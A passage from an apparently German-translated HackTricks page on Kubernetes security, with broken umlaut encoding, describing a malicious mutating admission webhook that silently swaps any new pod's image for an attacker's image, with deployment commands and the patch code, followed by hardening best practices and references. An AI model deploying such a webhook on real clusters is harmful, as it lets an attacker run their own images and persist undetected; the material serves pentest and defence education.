Mehr Informationen unter: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### B√∂sartiger Zulassungscontroller

Ein Zulassungscontroller **interceptiert Anfragen an den Kubernetes-API-Server** vor der Persistenz des Objekts, aber **nachdem die Anfrage authentifiziert** **und autorisiert** wurde.

Wenn ein Angreifer es irgendwie schafft, **einen Mutationg-Zulassungscontroller einzuschleusen**, wird er in der Lage sein, **bereits authentifizierte Anfragen zu modifizieren**. Dies k√∂nnte potenziell zu Privilegienerweiterung f√ºhren und h√§ufiger dazu f√ºhren, dass er im Cluster bestehen bleibt.

**Beispiel von** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
√úberpr√ºfen Sie den Status, um zu sehen, ob es bereit ist:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Dann bereitstellen eines neuen Pods:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Wenn Sie den Fehler `ErrImagePull` sehen, √ºberpr√ºfen Sie den Bildnamen mit einem der folgenden Abfragen:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Wie Sie im obigen Bild sehen k√∂nnen, haben wir versucht, das Image `nginx` auszuf√ºhren, aber das letztendlich ausgef√ºhrte Image ist `rewanthtammana/malicious-image`. Was ist gerade passiert!!?

#### Technische Details <a href="#heading-technicalities" id="heading-technicalities"></a>

Das Skript `./deploy.sh` richtet einen mutating webhook admission controller ein, der Anfragen an die Kubernetes-API gem√§√ü den in seinen Konfigurationszeilen festgelegten √Ñnderungen modifiziert und somit die beobachteten Ergebnisse beeinflusst:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## Beste Praktiken

### **Deaktivierung der automatischen Montage von Service Account-Token**

* **Pods und Service Accounts**: Standardm√§√üig binden Pods ein Service Account-Token ein. Um die Sicherheit zu erh√∂hen, erm√∂glicht Kubernetes die Deaktivierung dieses Automontage-Features.
* **Anwendung**: Legen Sie `automountServiceAccountToken: false` in der Konfiguration von Service Accounts oder Pods fest, beginnend ab Kubernetes-Version 1.6.

### **Einschr√§nkende Benutzerzuweisung in RoleBindings/ClusterRoleBindings**

* **Selektive Einbeziehung**: Stellen Sie sicher, dass nur notwendige Benutzer in RoleBindings oder ClusterRoleBindings enthalten sind. √úberpr√ºfen Sie regelm√§√üig und entfernen Sie irrelevante Benutzer, um die Sicherheit zu gew√§hrleisten.

### **Rollen f√ºr bestimmte Namespaces anstelle von Clusterweiten Rollen**

* **Rollen vs. ClusterRoles**: Verwenden Sie bevorzugt Rollen und RoleBindings f√ºr bereichsspezifische Berechtigungen anstelle von ClusterRoles und ClusterRoleBindings, die clusterweit gelten. Dieser Ansatz bietet eine feinere Kontrolle und begrenzt den Umfang der Berechtigungen.

### **Verwenden Sie automatisierte Tools**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referenzen**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
